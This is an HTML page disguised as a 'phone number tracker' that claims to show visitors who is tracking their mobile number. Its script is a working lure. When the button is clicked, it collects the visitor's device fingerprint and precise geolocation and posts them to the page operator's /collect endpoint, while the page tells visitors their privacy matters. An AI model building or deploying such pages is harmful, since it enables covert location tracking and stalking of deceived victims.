<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>PHONE NUMBER TRACKER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0c1f;
            min-height: 100vh;
            min-height: -webkit-fill-available;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
        }

        html {
            height: -webkit-fill-available;
        }

        .card {
            background: #1a1730;
            width: 100%;
            max-width: 480px;
            padding: clamp(20px, 6vw, 35px) clamp(16px, 5vw, 25px);
            border-radius: clamp(20px, 5vw, 25px);
            box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.6);
            border: 1px solid #2a2740;
            text-align: center;
            margin: auto;
        }

        h2 {
            color: #e0e0e0;
            font-size: clamp(18px, 5vw, 26px);
            font-weight: 500;
            line-height: 1.4;
            margin-bottom: clamp(15px, 4vw, 20px);
            word-break: break-word;
        }

        h2 span {
            display: block;
            font-size: clamp(24px, 7vw, 32px);
            font-weight: 700;
            background: linear-gradient(135deg, #9b87f5, #6e5bc8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-top: clamp(8px, 2vw, 12px);
            letter-spacing: 1px;
            word-break: break-all;
        }

        button {
            background: linear-gradient(135deg, #9b87f5, #6e5bc8);
            color: white;
            border: none;
            font-size: clamp(16px, 4.5vw, 20px);
            font-weight: 600;
            padding: clamp(14px, 4vw, 18px) clamp(20px, 6vw, 40px);
            border-radius: 60px;
            cursor: pointer;
            margin: clamp(15px, 5vw, 25px) 0 clamp(15px, 4vw, 20px);
            box-shadow: 0 15px 30px -8px #6e5bc880;
            transition: all 0.3s ease;
            border: 1px solid #b4a5f5;
            width: 100%;
            max-width: 320px;
            -webkit-appearance: none;
            appearance: none;
            touch-action: manipulation;
        }

        button:active {
            transform: scale(0.98);
            background: linear-gradient(135deg, #8a76e0, #5d4ab3);
        }

        /* Hover only for devices that support hover */
        @media (hover: hover) {
            button:hover {
                transform: translateY(-3px);
                box-shadow: 0 22px 40px -8px #9b87f5;
                background: linear-gradient(135deg, #a896ff, #7d6ad9);
            }
        }

        .status {
            background: #25223a;
            border-radius: clamp(15px, 4vw, 18px);
            padding: clamp(15px, 4vw, 20px);
            margin-top: clamp(20px, 5vw, 30px);
            border: 1px solid #35324a;
        }

        .phone-info {
            background: #201d33;
            border-radius: clamp(12px, 3vw, 15px);
            padding: clamp(12px, 3.5vw, 15px);
            margin-bottom: clamp(12px, 3vw, 15px);
            font-size: clamp(14px, 4vw, 16px);
            word-break: break-word;
        }

        .phone-info span {
            color: #9b87f5;
            font-weight: 600;
            display: inline-block;
            margin-left: 5px;
        }

        .phone-info small {
            color: #8f8bb3;
            font-size: clamp(11px, 3vw, 13px);
            display: block;
            margin-top: 8px;
            word-break: break-word;
        }

        hr {
            border: none;
            border-top: 1px solid #2f2b44;
            margin: clamp(12px, 3vw, 20px) 0;
        }

        .status p {
            color: #c0c0d0;
            font-size: clamp(12px, 3.5vw, 14px);
            margin-top: 8px;
            font-style: italic;
        }

        .note {
            color: #7a77a0;
            font-size: clamp(11px, 3vw, 13px);
            margin-top: clamp(15px, 4vw, 20px);
            padding: 0 5px;
            line-height: 1.5;
            word-break: break-word;
        }

        .note i {
            font-style: normal;
            color: #9b87f5;
            display: inline-block;
            margin-right: 4px;
        }

        /* Small phone optimization */
        @media (max-width: 360px) {
            body {
                padding: 8px;
            }
            
            .card {
                padding: 16px;
            }
            
            button {
                max-width: 260px;
            }
        }

        /* Landscape orientation */
        @media (max-height: 500px) and (orientation: landscape) {
            body {
                align-items: flex-start;
                padding: 20px;
            }
            
            .card {
                margin: 10px auto;
            }
            
            h2 span {
                font-size: 24px;
            }
        }

        /* Ensure button is easily tappable */
        @media (max-width: 768px) {
            button {
                min-height: 52px;
                touch-action: manipulation;
            }
        }
    </style>
</head>
<body>

<div class="card">
    <h2>
        FIND OUT WHOS TRACKING YOUR MOB NUMBER
        <span>7098896168</span>
    </h2>
    
    <button onclick="collect()">CLICK TO FIND</button>

    <div class="status">
        <div class="phone-info">
            📱 <span id="deviceDisplay">Device info will appear here</span>
            <small>after clicking the button</small>
        </div>
        <hr>
        <p>🔒 Your privacy is important to us</p>
    </div>
    
    <div class="note">
        <i>ⓘ</i> We'll collect basic device information to help you understand who might be tracking you
    </div>
</div>

<script>
// EXACT SAME LOGIC - NO CHANGES WHATSOEVER
function getDeviceModel(){
    const ua = navigator.userAgent;
    if(/iPhone/.test(ua)) return "iPhone";
    if(/iPad/.test(ua)) return "iPad";
    if(/Android/.test(ua)) return "Android device";
    return "Unknown device";
}

function collect(){
    const data = {
        language: navigator.language,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        deviceModel: getDeviceModel(),
        screen:{
            width: screen.width,
            height: screen.height
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory || null,
        cpuCores: navigator.hardwareConcurrency || null,
        touchSupport: 'ontouchstart' in window
    };

    // Update display with device model
    document.getElementById('deviceDisplay').innerHTML = data.deviceModel;

    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            pos=>{
                data.location={
                    lat:pos.coords.latitude,
                    lon:pos.coords.longitude,
                    accuracy:pos.coords.accuracy
                };
                send(data);
            },
            ()=>{
                send(data);
            }
        );
    }else{
        send(data);
    }
}

function send(data){
    fetch("/collect",{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify(data)
    });
    // Optional: Log to console for debugging
    console.log("Data collected:", data);
}
</script>

</body>
</html>
